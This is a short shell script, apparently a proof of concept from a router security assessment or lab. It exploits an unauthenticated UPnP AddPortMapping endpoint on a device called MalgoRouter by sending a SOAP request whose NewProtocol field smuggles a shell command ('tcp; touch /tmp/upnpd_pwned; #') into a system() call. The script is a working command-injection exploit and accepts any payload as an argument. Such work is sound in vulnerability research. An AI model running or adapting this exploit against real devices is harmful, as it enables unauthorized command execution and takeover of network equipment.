#!/bin/sh
# M2 - upnpd IGD AddPortMapping -> system("iptables ... -p <NewProtocol> ...").
# Unauthenticated, LAN reachable (SSDP udp/1900 advertises, IGD http/tcp/5000).
: "${TARGET:?set TARGET to the MalgoRouter IP}"
PORT="${UPNP_PORT:-5000}"
PROTO="${1:-tcp; touch /tmp/upnpd_pwned; #}"
echo "[*] POST AddPortMapping to $TARGET:$PORT/ctl/IPConn  (NewProtocol=$PROTO)"
curl -s --max-time 15 -X POST "http://$TARGET:$PORT/ctl/IPConn" \
  -H 'Content-Type: text/xml' -H 'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"' \
  --data-binary @- <<EOF
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 <s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
  <NewRemoteHost></NewRemoteHost>
  <NewExternalPort>4444</NewExternalPort>
  <NewProtocol>${PROTO}</NewProtocol>
  <NewInternalPort>4444</NewInternalPort>
  <NewInternalClient>127.0.0.1</NewInternalClient>
  <NewEnabled>1</NewEnabled><NewPortMappingDescription>x</NewPortMappingDescription>
  <NewLeaseDuration>0</NewLeaseDuration>
 </u:AddPortMapping></s:Body></s:Envelope>
EOF
echo
